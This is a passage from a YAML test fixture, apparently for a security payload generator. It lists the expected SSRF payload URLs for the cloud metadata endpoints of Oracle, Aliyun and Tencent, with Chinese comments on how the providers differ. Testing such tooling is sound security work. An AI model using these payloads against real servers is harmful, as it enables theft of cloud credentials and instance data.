    expect:
      # Oracle 走 /opc/v2/ 而不是 /latest/，路径里还带一个实例段
      payload: "http://169.254.169.254/opc/v2/instance/"

  - name: ssrf.generic.cloud.metadata · target=aliyun
    state:
      vuln: ssrf
      template: ssrf.generic.cloud.metadata
      slots: {target: aliyun}
      outputs: [raw]
    expect:
      # 阿里云不在 169.254 网段，是 100.100.100.200
      payload: "http://100.100.100.200/latest/meta-data/"

  - name: ssrf.generic.cloud.metadata · target=tencent
    state:
      vuln: ssrf
      template: ssrf.generic.cloud.metadata
      slots: {target: tencent}
      outputs: [raw]
    expect:
      payload: "http://metadata.tencentyun.com/latest/meta-data/"

  - name: ssrf.generic.cloud.metadata · target=huawei
    state:
      vuln: ssrf
